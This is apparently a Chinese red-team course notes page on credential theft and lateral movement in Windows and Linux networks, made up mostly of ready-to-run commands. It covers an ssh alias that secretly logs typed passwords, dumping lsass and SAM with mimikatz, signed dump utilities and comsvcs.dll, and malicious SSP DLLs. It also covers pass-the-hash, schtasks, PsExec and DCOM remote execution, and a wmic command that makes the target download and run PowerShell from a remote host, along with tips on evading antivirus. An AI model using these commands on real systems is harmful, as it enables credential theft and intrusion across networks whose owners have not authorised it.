<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">收集ssh登陆凭证：</span><br><span class="line">•# 添加命令别名</span><br><span class="line">•vi ~/.bashrc或者/etc/bashrc</span><br><span class="line">•<span class="keyword">alias</span> ssh=<span class="string">&#x27;strace -f -e trace=read,write -o /tmp/.ssh-`date &#x27;</span>+%d%h%m%s<span class="string">&#x27;`.log -s 32 ssh&#x27;</span></span><br><span class="line">•# 使命令别名立即生效</span><br><span class="line">•<span class="keyword">source</span> ~/.bashrc</span><br><span class="line">通过grep 找到匹配行的后<span class="number">8</span>行，可以根据密码长度调整行数:</span><br><span class="line">•grep -A <span class="number">9</span> <span class="string">&#x27;password&#x27;</span> .ssh<span class="number">-25</span>Sep091601017212.<span class="keyword">log</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711161217645.png" alt="image-20220711161217645"></p>
<hr>
<p><strong>Linux凭证窃取–全盘搜索敏感信息</strong></p>
<p>全局搜索配置文件、脚本、数据库、日志文件是否有包含密码。<br>•grep -rn “password=” /<br>•swap_digger<br>•一个用于自动进行Linux交换分析bash脚本，自动进行交换提取，并搜索Linux用户凭据，Web表单凭据，Web表单电子邮件，HTTP基本身份验证，WiFi SSID和密钥等。</p>
<hr>
<p><strong>Windows凭证窃取—概述</strong></p>
<p>市面上可见到的读Windows本地密码的大多工具都是变则法子的去读lsass.exe的内存或者SAM数据库，然后从里面提取hash。所以有杀软的情况下读密码这事根本就不是工具免不免杀的问题，而是杀软有没有监控保护lsass.exe或SAM的问题，所以读本地密码条件可以总结为：能正常访问lsass.exe内存或SAM数据库。</p>
<hr>
<p><strong>Windows凭证窃取—lsass.exe</strong></p>
<p>在内网渗透进行横向移动和权限提升时，最常用的方法是通过 dump 进程 lsass.exe，从中获得明文口令或者 hash。<br>lsass.exe（Local Security Authority Subsystem Service）是一个系统进程，用于微软 Windows 系统的安全机制，它用于本地安全和登陆策略。在进程空间中，存有着机器的域、本地用户名和密码等重要信息。但是需要首先获得一个高的权限才能对其进行访问。</p>
<hr>
<p><strong>Windows凭证窃取–Mimikatz直接读取Lsass</strong></p>
<p>优点：<br>•方便快捷<br>缺点：<br>•mimikatz必须免杀<br>•无法绕过部分AV对lsass的监控<br>•sekurlsa::logonpasswords<br>其实是调用ReadProcessMemory来将lsass进程读入内存中的另一个地址中，然后对进程进行解析：<br>•mimikatz.exe log “privilege::debug” “sekurlsa::logonPasswords full” exit</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711161451356.png" alt="image-20220711161451356"></p>
<hr>
<p><strong>Windows凭证窃取—CS中的mimikatz</strong></p>
<p>当目标机器在CS上线时，如果是管理员权限或者是SYSTEM权限的话，可以直接使用<br>•mimikatz sekurlsa::privilege full<br>•mimikatz sekurlsa::logonpasswords full<br>CS采用的是反射dll模块内存加载,这个主要实现了cs里的一些功能比如mimikatz，screenshot，sshagent，hashdump等等这些功能全部是由反射dll实现的，Cobalt Strike作者将这些功能拆分成一个个的反射dll在使用时才加载执行。</p>
<hr>
<p><strong>Windows凭证窃取–签名/白名单文件Dump</strong></p>
<p>优点：<br>•程序拥有合法签名<br>•远程Dump后下载到本地离线解析，减少特征<br>缺点：<br>•虽然有签名但部分AV仍会发出警告<br>•无法绕过部分AV对lsass的监控<br>•dump得到的内存转储文件可能触发报警</p>
<p>主要有以下几个程序：<br>•Procdump.exe<br>•SqlDumper.exe<br>•AvDump.exe<br>•createdump.exe<br>•rundll32.exe<br>其中1、2、4这三个工具是有微软签名的，3是有杀软厂商Avast的签名，rundll32这个LOLBIN就不用说了前两个工具的用法已经是老生常谈了，网上也有很多文章，主要讨论后三个PS：注意使用这些工具的时候最好是system权限，如果是administrator的话要注意是否有SeDebugPrivilege，如果没有的话可以在命令前使用powershell -c</p>
<p>ProcDump<br>ProcDump是微软签名的合法二进制文件，被提供用于转储进程内存。可以在微软文档中下载官方给出的ProcDump文件:<br>•<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a><br>我们以管理员的方式运行:<br>•Procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br>得到转储文件lsass.dmp后我们将这个内存dump文件拷贝到mimikatz同目录下，双击打开mimikatz执行：<br>•mimikatz # sekurlsa::minidump lsass.dmp<br>•mimikatz # sekurlsa::logonPasswords full</p>
<p>执行如下命令<br>•Procdump.exe -accepteula -ma lsass.exe lsass.dmp<br>•在本机的上面跑 mimikazi 进行密码的成功查看<br>免杀效果<br>360杀，火绒新版不杀</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711161726679.png" alt="image-20220711161726679"></p>
<p>AvDump.exe<br>AvDump.exe是杀软Avast自带的一个程序，该程序可以用来dump进程的内存，拥有Avast的签名<br><code>•.\AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0</code><br>注意需要在ps中调用，否则cmd默认是不开启seDEBUGPrivilege权限的，但是现在360会检测到avdump</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711161811913.png" alt="image-20220711161811913"></p>
<p>SQLDumper.exe<br>SQLDumper.exe包含在Microsoft SQL和Office中，可生成完整转储文件。<br>•tasklist /svc | findstr lsass.exe 查看lsass.exe 的PID号<br>•Sqldumper.exe ProcessID 0 0x01100 导出mdmp文件<br>实战中下把生成的mdmp文件下载到本地，使用相同的操作系统打开。<br>•mimikatz.exe “sekurlsa::minidump SQLDmpr0001.mdmp”<br>“sekurlsa::logonPasswords full” exit<br>•mimikatz.exe “sekurlsa::minidump SQLDmpr0001.mdmp”<br>“sekurlsa::logonPasswords full” exit<br>文件是安全的，火绒和360都不会认为是可以或者是恶意程序，但是在转储该lsass.exe进程时会出现</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711161940902.png" alt="image-20220711161940902"></p>
<p>CreateDump.exe<br>createdump.exe随着.NET5出现的，本身是个native binary    虽然createdump.exe是随着.NET5出现的，但因为它是native binary，所以执行时并不需要依赖.NET5的环境<br><code>•createdump.exe -u -f lsass.dmp &lt;lsass pid&gt;</code></p>
<p>上述某些操作cmd执行不会自动提权，需要开启powershell或者powershell -c “ “去执行，或者psexec -s ，本质是需要se_debug权限在dump指定进程内存文件时，需要开启SeDebugPrivilege权限<br>•管理员权限的cmd下，默认支持SeDebugPrivilege权限，但是状态为Disabled<br>•管理员权限的powershell下，默认支持SeDebugPrivilege权限，并且状态为Enabled</p>
<hr>
<p><strong>Windows凭证窃取–利用SilentProcessExit进行Dump</strong></p>
<p>该技术和Werfault.exe进程有关，在某个运行中的进程崩溃时，werfault.exe将会Dump崩溃进程的内存，从这一点上看，我们是有可能可以利用该行为进行目标进程内存的Dump。在<a target="_blank" rel="noopener" href="https://www.mrwu.red/web/2000.html">https://www.mrwu.red/web/2000.html</a> 这篇文章中介绍了利用蓝屏崩溃来绕过卡巴斯基dump lsass进程,在win7之后，windows引入一些进程退出的相关机制称为“静默进程退出”的机制，该机制提供了在两种情况下可以触发对被监控进行进行特殊动作的能力：<br>•被监控进程调用 ExitProcess() 终止自身；<br>•其他进程调用 TerminateProcess() 结束被监控进程。</p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/lengjibo/RedTeamTools/tree/master/windows/LsassSilentProcessExit">https://github.com/lengjibo/RedTeamTools/tree/master/windows/LsassSilentProcessExit</a></p>
<p>优点：系统正常行为<br>缺点：需要写注册表<br>但在卡巴斯基环境下，不会报警但dump文件为0kb(猜测是卡巴拒绝系统行为转储lsass进程)而遇到defender+360的情况下，同样不会触发报警，但该程序无法修改注册表项</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711162209003.png" alt="image-20220711162209003"></p>
<hr>
<p><strong>Windows凭证窃取–使用系统内置功能(comsvcs.dll)</strong></p>
<p>每个Windows系统中都可以找到该文件，可以使用Rundll32执行其导出函数MiniDump实现进程的完全转储。该文件是一个白名单文件，我们主要是利用了Comsvsc.dll中的导出函数APIMiniDump来实现转储lsass.exe的目的，注意同样是需要管理员权限:该文件位于C:\windows\system32\comsvcs.dll    我们使用如下方式来调用MiniDump实现转储lsass.exe进程:<br>•rundll32 C:\windows\system32\comsvcs.dll MiniDump “&lt;lsass.exe pid&gt; dump.bin full”</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711162308348.png" alt="image-20220711162308348"></p>
<hr>
<p><strong>Windows凭证窃取–SSP</strong></p>
<p>安全支持提供程序（SSP）是一个dll文件，用于扩展Windows身份验证机制。我们熟悉的lsass进程在启动时会加载安全支持提供程序SSP。当我们替换某个ssp为恶意ssp，或者将ssp文件上传，修改lsa注册表使之启动时加载，然后我们就可以<br>利用恶意dll将输入lsass程序的明文密码保存下来，实现抓明文密码。此方法适用于win8/win2012后无法获取明文密码，或者维持域控、在域控上抓用户密码(前提是有管理员权限）</p>
<p>优点：<br>•可以绕过部分杀软对lsass的监控<br>•可以加载mimilib来记录密码以应对版本大于等于Windows Server 2012的情况<br>•不需要重启服务器<br>缺点：<br>•需要写注册表<br>•需要将SSP的dll拷贝到system32下（这个说缺点似乎也谈不上）<br>•Blue Team可以通过枚举SSP来发现我们自定义的SSP，并且lsass进程中可以看到加载的DLL</p>
<hr>
<p><strong>Windows凭证窃取–签名/白名单文件Dump</strong></p>
<p>优点：<br>不需要重启服务器<br>Lsass进程中不会出现可疑的DLL<br>缺点：<br>需要调用WriteProcessMemory对lsass进行操作，可能会被标记</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711162538115.png" alt="image-20220711162538115"></p>
<hr>
<p><strong>Windows凭证窃取—Windows SAM</strong></p>
<p>在win中，NTLM hash通常储存在SAM文件中<br>•物理路径：C:\windows\system32\config\SAM<br>SAM是windows系统的一个系统用户账号管理文件。win中对用户账户的安全管理使用了安全账号管理器SAM的机制,安全账号管理器对账号的管理是通过安全标识进行的，安全标识在账号创建时就同时创建，一旦账号被删除，安全标识也同时被删除。一旦某个账号被删除，它的安全标识就不再存在了，即使用相同的用户名重建账号，也会被赋予不同的安全标识，不会保留原来的权限。SAM 文件一旦丢失，会失去所有用户账号。</p>
<hr>
<p><strong>Windows凭证窃取—SAM抓取</strong></p>
<p>Imapcket-secretdump<br>•reg save hklm\sam sam.hive<br>•reg save hklm\system system.hive<br>•reg save hklm\security security.hive<br>•python3 secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711162707310.png" alt="image-20220711162707310"></p>
<p>mimikatz在线读取SAM数据库<br>•privilege::debug<br>•token::elevate<br>•lsadump::sam</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711162755691.png" alt="image-20220711162755691"></p>
<p>利用empire里面的一个powershell脚本，下载地址：<br>•<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711162849579.png" alt="image-20220711162849579"></p>
<p>从左到右依次是用户名，Rid，ntlm，lm。<br>Rid为500代表是管理员，504代表是guest账号等。lm跟ntlm的区别是加密方法的不同</p>
<hr>
<p><strong>Windows凭证窃取– SAM 解密</strong></p>
<p>要解密 hash，我们需要获取到 SAM SYSTEM SECURITY 这三个⽂件。只要有这3个文件我们就能进行读取。<br>REG SAVE 将指定的子项、项和注册表值的副本保存到指定文件中，直接保存就可以了<br>•reg save hklm\system SYSTEM<br>•reg save hklm\sam SAM<br>•reg save hklm\security SECURITY</p>
<p>解密恢复 HASH<br>通过上面几种方法拿到 3 个文件后，我们用 impacket-secretsdump 来进行解密。<br>•impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL<br>用得到的 HASH 直接去解密即可。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711162947047.png" alt="image-20220711162947047"></p>
<hr>
<p><strong>Windows凭证窃取–KB2871997</strong></p>
<p>如果系统安装KB2871997补丁或者系统版本大于等于window server 2012时(服务器版本),大于等于win8.1(家庭版本)时（自带补丁），默认在lsass.exe这个进程中不会再将可逆的密文缓存在自己的进程内存中，所以我们默认是没办法通过读取这个进程然后逆向该密文来获取明文密码。<br>•<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed">https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed</a></p>
<hr>
<p><strong>Windows凭证窃取—总结</strong></p>
<p>•无杀软随便玩，直接mimikatz上去读就是<br>•无监控lsass的AV/EDR，可以通过免杀mimikatz进行直接读取，也可以使用白名单程序进行dump（需要注意部分杀软会对白名单程序报警）<br>•如果是卡巴这种监控lsass的，最好是使用加载SSP的方式，优缺点参考前面的，可以根据不同情况使用不同的方法</p>
<h2 id="横-向-中-的-命-令-执-行"><a href="#横-向-中-的-命-令-执-行" class="headerlink" title="横 向 中 的 命 令 执 行"></a>横 向 中 的 命 令 执 行</h2><p><strong>内网横向—Pass-the-hash</strong></p>
<p>不论是网站还是windows系统，都不会去明文存储用户的密码，是最基本的一条安全准则。那么进行相关登录验证的时候，就会获取用户输入的明文密码然后经过加密处理后再和数据库中的散列值进行对比，从而进行相关校验所谓PTH即Pass the Hash缩写，字面理解密码就是hash的意思。我们一般拿到windows的ntlmhash后会进行相关破解，如果密码复杂度高可能一般破解不容易，那么我们可以直接拿hash去进行相关服务的访问，拿hash当作密码给服务器校验。总结一句话：用户使用哈希而不需要原始密码就能进行身份验证</p>
<p>pth批量横向移动<br>CME集成了wmiexec、atexe、smbexec的方式,集成了smb扫描,口令爆破等功能,非常适合拿来快速移动。支持批量传递hash的功能<br>•cme smb 10.73.147.90 10.73.147.88 -u administrator -H 852a844adfce18f66009b4f14e0a98de</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711163214255.png" alt="image-20220711163214255"></p>
<p>Cobalt Strike 的pth</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711163245133.png" alt="image-20220711163245133"></p>
<hr>
<p><strong>内网横向—IPC$ &amp;&amp; 计划任务</strong></p>
<p>计划任务，需要Administrators才能执行，之前我也说过用它提权方法，因为它的默认权限是system，不过到了2008之后便不能交互式了，比如下面这样。<br>•没有禁用IPC$连接、139和445端口、未使用防火墙等方式来阻止IPC$。<br>•目标机器开启了相关的IPC$服务。<br>•需要目标机器的管理员账号和密码（IPC$空连接除外）。<br>•需要得知目标机器IP地址并可互相通信。<br>ipc远程命令执行<br>•net use \1.1.1.1\ipc$ “password” /user:username<br>Schtasks远程命令执行<br>•schtasks /create /s 1.1.1.1 /u domain\Administrator /p password /ru “SYSTEM” /tn “windowsupdate” /sc DAILY /tr “calc” /F<br>•schtasks /run /s 1.1.1.1 /u domain\Administrator /p password /tn windowsupdate</p>
<hr>
<p><strong>内网横向—PsExec</strong></p>
<p>psexec 是 windows 下非常好的一款远程命令行工具。psexec的使用不需要对方主机开方3389端口，只需要对方开启admin$共享 (该共享默认开启)。但是，假如目标主机开启了防火墙，psexec也是不能使用的，会提示找不到网络路径。<br>psexec的基本原理：<br>•通过ipc$连接admin$，释放二进制文件psexecsvc.exe到目标<br>•通过服务管理SCManager远程创建一个psexec服务，并启动服务<br>•客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据<br>•运行结束后删除服务<br>用服务启动的方式：<br>•psexec \target -accepteula -u username -p password cmd.exe<br>•psexec.py jumbolab.com/<a href="mailto:&#x61;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x40;&#x31;&#x37;&#x32;&#46;&#x31;&#54;&#46;&#x31;&#50;&#55;&#x2e;&#49;&#56;&#x34;">&#x61;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x40;&#x31;&#x37;&#x32;&#46;&#x31;&#54;&#46;&#x31;&#50;&#55;&#x2e;&#49;&#56;&#x34;</a></p>
<hr>
<p><strong>内网横向—WMI</strong></p>
<p>WMI全称“windows管理规范”，从win2003开始一直存在。<br>利用条件<br>•WMI服务开启，端口135，默认开启。<br>•防火墙允许135、445等端口通信。<br>•管理员权限，以及本地管理员组…<br>关于域用户添加进本地管理组的方法，可以参考(<a target="_blank" rel="noopener" href="https://richardstk.com/2013/11/26/adding-domain-users-to-the-local-administrators-group-using-group-policy/">https://richardstk.com/2013/11/26/adding-domain-users-to-the-local-administrators-group-using-group-policy/</a>)<br>windows自带wmic工具横向移动<br>•wmic /NODE:192.168.93.20 /user:”TEST\administrator” /password:”zxcASDqwe123” PROCESS call create “powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.0.108:8080/a&#39;))\&quot;&quot;">http://192.168.0.108:8080/a&#39;))\&quot;&quot;</a></p>
<p>wmiexec.vbs<br>域环境下还是在工作组环境下都可正常使用。使用域账号或本地账号均可<br>工作组：<br>•cscript wmiexec.vbs /shell 192.168.x.x administrator Aatest<br>域环境：<br>•cscript wmiexec.vbs /shell 192.168.93.20 TEST\administrator zxcASDqwe123<br>为了解决wmic无法回显命令而开发的一个工具，原理就是把数据先存到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显 “执行命令的结果”和获取 “半交互式的shell”。</p>
<p>Invoke-TheHash.ps1<br>分别导入Invoke-WMIExec.ps1和Invoke-TheHash.ps1，然后批量撞网段内的机器即可.<br>•Invoke-TheHash -Type WMIExec -Target 192.168.93.0/24 -Domain TEST -Username administrator -Hash aad3b435b51404eeaad3b435b51404ee<br>impacket套件<br>域用户<br>•优点：支持pth<br>•缺点：他的使用需要调用wmi服务，占用目标的445、135和另一个随机端口。<br>•python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c 域<br>名/<a href="mailto:&#97;&#100;&#109;&#105;&#110;&#x69;&#x73;&#x74;&#x72;&#x61;&#116;&#111;&#114;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#x78;&#x78;&#x2e;&#120;&#120;&#120;">&#97;&#100;&#109;&#105;&#110;&#x69;&#x73;&#x74;&#x72;&#x61;&#116;&#111;&#114;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#x78;&#x78;&#x2e;&#120;&#120;&#120;</a> “ipconfig”</p>
<p>WMIHACKER(推荐)<br>免杀横向渗透远程命令执行，常见的WMIEXEC、PSEXEC执行命令是创建服务或调用Win32_Process.create执行命令，这些方式都已经被杀软100%拦截，通过改造出WMIHACKER免杀横向移动测试工具。(只依赖135端口，不依赖139和445端口)<br>重要：支持pth -&gt; <a target="_blank" rel="noopener" href="https://github.com/360-Linton-Lab/WMIHACKER/issues/1">https://github.com/360-Linton-Lab/WMIHACKER/issues/1</a><br>主要功能：1、命令执行；2、文件上传；3、文件下载<br>•<a target="_blank" rel="noopener" href="https://github.com/360-Linton-Lab/WMIHACKER">https://github.com/360-Linton-Lab/WMIHACKER</a><br>•<a target="_blank" rel="noopener" href="https://github.com/checkymander/Sharp-WMIExec">https://github.com/checkymander/Sharp-WMIExec</a><br>•<a target="_blank" rel="noopener" href="https://github.com/nccgroup/WMIcmd">https://github.com/nccgroup/WMIcmd</a><br>调用Win32_ScheduledJob取代Win32_Process2</p>
<p>wmi bypasss<br>•可能拦截了WMI process creation through win32_process，可以试试其他的方式<br>•<a target="_blank" rel="noopener" href="https://github.com/rootclay/WMIHACKER">https://github.com/rootclay/WMIHACKER</a><br>•调用任务计划<br>•<a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpWMI">https://github.com/GhostPack/SharpWMI</a><br>•remote execution of arbitrary VBS through WMI event<br>调用Win32_ScheduledJob取代Win32_Process2</p>
<hr>
<p><strong>内网横向—DCOM</strong></p>
<p>DCOM（分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。DCOM是COM（组件对象模型）的扩展，它允许应用程序实例化和访问远程计算机上COM对象的属性和方法。DCOM 使用远程过程调用（RPC）技术将组件对象模型（COM）的功能扩展到本地计算机之外，因此，在远程系统上托管COM服务器端的软件（通常在DLL或exe中）可以通过RPC向客户端公开其方法。</p>
<p>COM 是 Windows 的一个组件，可促进软件之间的互操作性，DCOM 使用远程过程调用 (RPC)将其扩展到整个网络。<br>分布式组件对象模型(DCOM)远程协议是一种通过远程调用(RPC)公开应用程序对象的协议在windows注册表包含3个标识符中的DCOM配置数据：<br>•CLSID：类标识符是全局唯一标识符。在windows在程序中为每个以及安装的类储存一个CLSID。当我们需要运行一个类的时候，只需要知道正确的CLSID即可<br>•PROGID：程序标识符，这个是程序员用来替代更为复杂的GLSID，同意理解。<br>•APPID：应用程序标识符，为了简化通用安全和配置设置的管理，由同一可执行文件托管的分布式 COM 对象被分组到一个 AppID 中，属于同一可执行文件的所有类以及访问它所需的权限。如果 APPID 不正确，DCOM 将无法工作。</p>
<p>一个DCOM运行流程<br>•客户端请求远程计算机通过CLSID或者PROGID创建一个对象。如果通过了APPID，远程计算机将会使用PROGID查找CLSID。<br>•远程计算机检查APPID并且验证客户端是否具有创建对象权限。<br>•如果是exe则通过DCOMLaunch.exe如果是dll则通过DLLHOST.exe创建客户端计算机请求的类实例。<br>•如果沟通成功，则客户端可以访问远程计算机上类的所有函数。<br>攻击者可使用 DCOM 进行横向移动，通过 DCOM，攻击者可在拥有适当权限的情况下通过Office 应用程序以及包含不安全方法的其他 Windows 对象远程执行命令</p>
<p>利用DCOM进行横向移动有两个条件：<br>•能关闭靶机防火墙<br>•拥有cmdshell、靶机需要使用administrator账户<br>DCOM进行横向移动的操作如下：<br>•与靶机建立ipc连接<br>•cs生成木马使用copy命令上传到靶机<br>•调用DCOM远程执行命令</p>
<p>通过PowerShell与DCOM进行远程交互，此外，我们只需要提供一个DCOM ProgID和一个IP地址，然后，它就从远程返回一个COM对象的实例。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">•<span class="variable">$com</span> =[activator]::CreateInstance([type]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;192.168.52.138))</span></span><br><span class="line"><span class="string">•<span class="subst">$com</span>.Document.ActiveView.ExecuteShellCommand(&#x27;cmd.exe&#x27;,<span class="subst">$null</span>,&quot;</span>/c c:\shell.exe<span class="string">&quot;,&quot;</span>Minimized<span class="string">&quot;)</span></span><br></pre></td></tr></table></figure>

<p>执行以上命令我们就可以调用ExecuteShellCommand方法在远程主机上启动进程</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711165329047.png" alt="image-20220711165329047"></p>
<p>通过调用9BA05972-F6A8-11CF-A442-00A0C90A8F39来执行exe文件</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">•<span class="variable">$com</span> = <span class="selector-attr">[Type]</span>::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="string">&quot;192.168.52.138&quot;</span>)</span><br><span class="line">•<span class="variable">$obj</span> = <span class="selector-attr">[System.Activator]</span>::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line">•<span class="variable">$item</span> = <span class="variable">$obj</span><span class="selector-class">.item</span>()</span><br><span class="line">•<span class="variable">$item</span><span class="selector-class">.Document</span><span class="selector-class">.Application</span><span class="selector-class">.ShellExecute</span>(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c c:\shell.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>调用Excel.Application远程执行命令<br>通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">•<span class="variable">$com</span> =</span><br><span class="line"><span class="selector-attr">[activator]</span>::CreateInstance(<span class="selector-attr">[type]</span>::GetTypeFromprogID(<span class="string">&quot;Excel.Application&quot;</span>,<span class="string">&quot;192.168.52.138&quot;</span>))</span><br><span class="line">•<span class="variable">$com</span><span class="selector-class">.DisplayAlerts</span> = <span class="variable">$false</span></span><br></pre></td></tr></table></figure>

<p>然后执行如下命令，我们就可以调用该对象的”DDEInitiate”方法在远程主机上启动进程</p>
<p>•$com.DDEInitiate(“cmd.exe”,”/c C:\shell.exe”)</p>
<p>利用工具<br><a target="_blank" rel="noopener" href="https://gitlab.com/theepicpowner/dcom_av_exec">https://gitlab.com/theepicpowner/dcom_av_exec</a><br>Impacket – dcomexec.py<br>•python3 ./dcomexec.py [domain/]username:password@ip     //创建一个交互式shell<br>•python3 ./dcomexec.py [domain/]username:password@ip command     //执行命令</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711165544101.png" alt="image-20220711165544101"></p>
<hr>
<p><strong>内网横向—Winrm</strong></p>
<p>WinRM 指的是Windows远程管理服务，通过远程连接winRM模块可以操作windows命令行，默认监听端口5985（HTTP）&amp;5986 (HTTPS)，在2012及以后默认开启。winRM横向移动同时适用于工作组和域环境。<br>利用条件<br>•通信的双方都需要开启WinRM服务<br>•服务端防火墙允许WinRM服务端口通信<br>•WinRM通信两端配置要求<br>远程命令执行<br>•winrs -r:192.168.86.114 -u:192.168.86.114\administrator -p:123456!@#$% whoami<br>•winrs -r:192.168.86.114 -u:192.168.86.114\administrator -p:123456!@#$% cmd</p>
<p>•CS自带了一些用于横向移动的功能，可以在目标中选中主机进行攻击。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711165905203.png" alt="image-20220711165905203"></p>
<p>利用工具:<br>winrmdll<br>•<a target="_blank" rel="noopener" href="https://github.com/mez-0/winrmdll">https://github.com/mez-0/winrmdll</a><br>WSMan-WinRM，使用WSMan.Automation COM对象通过WinRM执行远程命令。<br>•<a target="_blank" rel="noopener" href="https://github.com/bohops/WSMan-WinRM">https://github.com/bohops/WSMan-WinRM</a><br>开启远程主机3389<br>如果目标开启了WinRM可以利用PeekABoo工具使目标开启3389<br>•<a target="_blank" rel="noopener" href="https://github.com/Viralmaniar/PeekABoo">https://github.com/Viralmaniar/PeekABoo</a><br>CS自带了一些用于横向移动的功能，可以在目标中选中主机进行攻击。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711165936638.png" alt="image-20220711165936638"></p>
<hr>
<p><strong>内网横向—RDP</strong></p>
<p>RDP协议<br>RDP，Remote Desktop Protocol，远程桌面协议，该协议是对国际电信联盟发布的一个国际标准的多通道会议协议 T.120 的一个扩展。远程桌面协议让用户（客户端或称 “本地电脑”）连上提供微软终端机服务的电脑（服务器端或称 “远程电脑”）。大部分的 Windows、Linux、FreeBSD、Mac OS X 都有相应的客户端。远程桌面协议在服务端默认监听 TCP 3389 端口的数据。远程桌面协议为用户提供了通过网络连接远程登录到另一台计算机的图形界面。判断是否开启RDP<br>•REG QUERY “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /v PortNumber</p>
<p>RDP 服务的启动<br>如果发现 3389 并没有开启，我们使用以下方式开启它。修改注册表启动先通过修改注册表来设置一下允许远程桌面连接：<br>•REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br>然后可以再配置一下防火墙，设置为允许远程桌面连接，命令：<br>•netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow<br>通过 Metasploit 模块启动<br>我们可以使用 post/windows/manage/enable_rdp 模块对目标主机快速完成上述配置：<br>•use post/windows/manage/enable_rdpset session 1exploit</p>
